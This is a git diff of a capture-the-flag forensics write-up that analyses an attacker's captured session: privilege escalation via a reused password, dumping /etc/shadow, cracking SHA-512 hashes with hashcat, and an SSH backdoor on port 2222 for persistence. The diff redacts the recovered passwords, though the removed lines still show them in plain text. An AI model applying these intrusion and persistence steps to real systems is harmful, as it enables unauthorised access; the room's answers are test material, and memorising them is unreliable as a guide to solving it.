@@ -76,7 +76,7 @@ Upload File
 - You'll get the pop up window containing all the shell commands run by the adversary.
     - Shell stabilizing
     - Fetching the ROT47 password of www-data: `[{"name":"System","pass":"saydrawnlyingpicture"}]`
-    - Switching to james user with the password: `whenevernoteartinstant`
+    - Switching to james user with the password: `REDACTED`
     - Dumping the `/etc/shadow` file
     - Setting up ssh backdoor on **port 2222** for persistence using `https://github.com/NinjaJc01/ssh-backdoor`.
 
@@ -94,7 +94,7 @@ www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass
 cat .overpass
 ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ su james
 su james
-Password: whenevernoteartinstant
+Password: REDACTED
 
 james@overpass-production:/var/www/html/development/uploads$ cd ~
 cd ~
@@ -111,7 +111,7 @@ usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
             prompt] [-T timeout] [-u user] file ...
 james@overpass-production:~$ sudo -l
 sudo -l
-[sudo] password for james: whenevernoteartinstant
+[sudo] password for james: REDACTED
 
 Matching Defaults entries for james on overpass-production:
     env_reset, mail_badpass,
@@ -251,7 +251,7 @@ SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
 ```
 
 ### What password did the attacker use to privesc?
-- **Answer:** whenevernoteartinstant
+- **Answer:** REDACTED
 
 ### How did the attacker establish persistence?
 - **Answer:** https://github.com/NinjaJc01/ssh-backdoor
@@ -316,12 +316,12 @@ Dictionary cache built:
 * Keyspace..: 222
 * Runtime...: 0 secs
 
-$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
-$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
-$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
+$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:REDACTED
+$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:REDACTED
+$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:REDACTED
 Approaching final keyspace - workload adjusted.  
 
-$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
+$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:REDACTED
                                                  
 Session..........: hashcat
 Status...........: Exhausted
@@ -341,15 +341,6 @@ Candidates.#1....: 2003 -> starwars
 
 Started: Thu May 20 13:14:07 2021
 Stopped: Thu May 20 13:14:13 2021
-```
-
-- User accounts and their respective passwords:
-
-```bash
-paradox:secuirty3
-szymex:secret12
-bee:abcd123
-muirland:1qaz2wsx
 ```
 
 ---
@@ -505,7 +496,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 967.49 seconds
 ```
 
-- Using `james` and the hash we recently cracked as the password, we can login into the backdoor:
+- Using `james` as the user and the hash we recently cracked as the password, we can login into the backdoor:
 - **Note:** `-p` argument must be used to specify the port!
 
 ```bash
